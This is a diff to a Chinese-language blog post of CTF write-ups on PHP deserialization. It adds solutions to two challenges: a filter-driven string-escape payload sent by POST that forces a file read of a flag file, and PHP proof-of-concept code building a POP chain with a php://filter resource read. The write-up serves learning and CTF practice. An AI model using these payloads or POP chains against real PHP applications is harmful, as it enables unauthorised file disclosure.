@@ -1,7 +1,7 @@
 ---
 author: "Yiming Shen"
 date: 2022-06-11
-lastmod: 2022-07-05
+lastmod: 2022-07-07
 title: "PHP 反序列化"
 tags: [
     "CTF",
@@ -207,7 +207,7 @@ else
     echo serialize($show);
     echo '
     ';
-    $show->source=$show; //存疑，这个地方照葫芦画瓢，但不明意思
+    $show->source=$show; //这个地方是为了触发Show类中的__toString方法，因为正则判断是对source进行字符串化
     echo serialize($show);
 ?>
 ```
@@ -409,6 +409,147 @@ use FileHandler as GlobalFileHandler;
 ?>
 ```
 
+### [安洵杯 2019] easy_serialize_php
+
+
+
+```php
+<?php
+// 	d0g3_f1ag.php
+$function = @$_GET['f'];
+
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo '<a href="index.php?f=highlight_file">source_code</a>';
+}
+
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+}
+```
+
+1. 先查看phpinfo，发现敏感文件泄露：`d0g3_f1ag.php`，即使用`file_get_contents`读该文件
+2. 存在过滤，以及使用sha1函数替换了用户传入的`img_path`，sha1和base64应该是不太可能碰撞的，考虑绕过过滤。
+3. 过滤方式是简单替换为空，存在绕过的可能。
+
+#### 知识点
+
+1. 本题的`$_SESSION`其实并不是PHP的自带变量，而是用户定义的变量，我们在`extract($_POST)`这里通过POST方式控制其内容。
+
+2. **不是只有类和对象才有序列化和反序列化**，类、对象、数组、变量均可进行序列化。
+
+   ```php
+   a - array
+   b - boolean
+   d - double
+   i - integer
+   o - common object
+   r - reference
+   s - string
+   C - custom object
+   O - class
+   N - null
+   R - pointer reference
+   U - unicode string
+   ```
+
+3. PHP进行反序列化时，并不要求字符串严格按照格式，而是按照从左至右的顺序和预先安排的字符个数进行依次读取。
+
+   故而在未遇到字符串尾：`;`和读满字符个数之前，会将遇到的所有字符当作相应的对象名或内容。
+
+#### PHP 反序列化字符逃逸
+
+> 字符逃逸的本质即为闭合。分为两种情况，一是字符变多，二是字符变少。
+
+本题存在过滤后字符变少的情况。
+
+由于程序会将`$_SESSION['img']`设置为固定值，我们要控制改变这里的值，需要让程序错位读取我们设置的值。
+
+- 我们希望的`img`序列化结果(读取base64编码后的`d0g3_f1ag.php`)：
+
+  `s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";`
+
+- 我们可以在程序反序列化时，添加一个新的数组元素，覆盖掉原有的img元素，类似于SQL注入
+
+  `$_SESSION['xx']='";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'`
+
+- `$_SESSION`序列化后：
+
+  ` a:1:{s:2:"xx";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}`
+
+- 此时数一下多余的字符数：`;s:51:""`为8个，可用`flagflag`拼凑
+
+- ` a:1:{s:8:"flagflag";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}`
+
+- 被过滤后，变成了：` a:1:{s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}`，此时，原先多余的八个字符正好会被当作第一个元素的名字，而`s:3:"aaa"`即为它的值，而后面的`img`参数能被正常解析成功！
+
+**Payload**
+
+POST： `$_SESSION['flagflag']=";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`
+
+(去掉两个单引号是因为http协议中的post请求无需用引号覆盖，而PHP的字符串内容需要单引号)
+
+### [MRCTF2020]Ezpop
+
+本题与POP链构造的实例相同，需要注意的是最后的文件读取用的是文件包含`include`的函数，故而需要用到文件包含的`php://filter`伪协议。
+
+**POC**
+
+```php
+<?php
+    class Modifier{
+        protected $var='php://filter/convert.base64-encode/resource=flag.php';
+    }
+    class Show{
+        public $source;
+        public $str;
+        public function __construct($file='flag.php'){
+            $this->source = $file;
+            // echo 'Welcome to '.$this->source."<br>";
+        }
+    }
+    class Test{
+        public $p;
+
+    }
+    $modifier = new Modifier();
+    $show = new Show();
+    $test = new Test();
+    $test->p = $modifier;
+    $show->str = $test;
+    $show->source = $show;
+    echo urlencode(serialize($show));
+?>
+```
+
 
 
 
@@ -420,4 +561,5 @@ use FileHandler as GlobalFileHandler;
 1. [PHP反序列化和POP链构造 - As1def's Blog](https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/)
 2. [一题教你学会构造PHP反序列化POP链](https://www.freebuf.com/articles/web/247930.html)
 3. [BUUCTF刷题——PHP反序列化 - CA01H' Blog](https://ca01h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
+4. [PHP 反序列化——字符逃逸](https://xz.aliyun.com/t/9213)
 
